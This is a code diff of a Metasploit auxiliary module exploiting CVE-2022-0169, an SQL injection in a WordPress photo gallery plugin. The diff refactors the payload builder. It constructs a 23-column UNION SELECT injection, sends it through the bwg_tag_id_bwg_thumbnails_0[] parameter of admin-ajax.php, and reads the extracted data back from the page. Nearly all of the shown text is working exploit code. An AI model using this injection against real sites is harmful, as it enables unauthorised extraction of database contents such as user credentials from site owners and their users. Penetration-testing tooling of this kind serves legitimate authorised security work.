@@ -31,8 +31,6 @@ class MetasploitModule < Msf::Auxiliary
           ['WPVDB', '0b4d870f-eab8-4544-91f8-9c5f0538709c'],
           ['URL', 'https://github.com/X3RX3SSec/CVE-2022-0169']
         ],
-        'Actions' => [['SQLi', { 'Description' => 'Perform SQL Injection via bwg_frontend_data' }]],
-        'DefaultAction' => 'SQLi',
         'DefaultOptions' => {
           'VERBOSE' => true,
           'COUNT' => 5
@@ -54,30 +52,34 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_sqli_object
     create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
-      expr = payload.to_s.gsub(/\s+/, ' ').strip
-      cols = Array.new(23) { |i| i == 7 ? "(#{expr})" : rand(1000..9999).to_s }
-      injected = ")\" union select #{cols.join(',')} -- -"
-      endpoint = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
-      params = {
-        'action' => 'bwg_frontend_data',
-        'shortcode_id' => '1',
-        'bwg_tag_id_bwg_thumbnails_0[]' => injected
-      }
+      expression = payload.to_s.strip.gsub(/\s+/, ' ')
+      columns = Array.new(23) { |i| i == 7 ? "(#{expression})" : rand(1000..9999) }
+      injected = ")\" union select #{columns.join(',')} -- -"
 
-      res = send_request_cgi('method' => 'GET', 'uri' => endpoint, 'vars_get' => params)
-      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php'),
+        'vars_get' => {
+          'action' => 'bwg_frontend_data',
+          'shortcode_id' => '1',
+          'bwg_tag_id_bwg_thumbnails_0[]' => injected
+        }
+      )
+      next GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200
 
       node = res.get_html_document.at_css('div.bwg-title2')
-      node ? node.text : GET_SQLI_OBJECT_FAILED_ERROR_MSG
+      result = node&.text.to_s.strip
+      next GET_SQLI_OBJECT_FAILED_ERROR_MSG if result.empty?
+
+      result
     end
   end
 
   def check
     @sqli = get_sqli_object
     return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
-    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable
 
-    Exploit::CheckCode::Safe
+    @sqli.test_vulnerable ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
   end
 
   def run
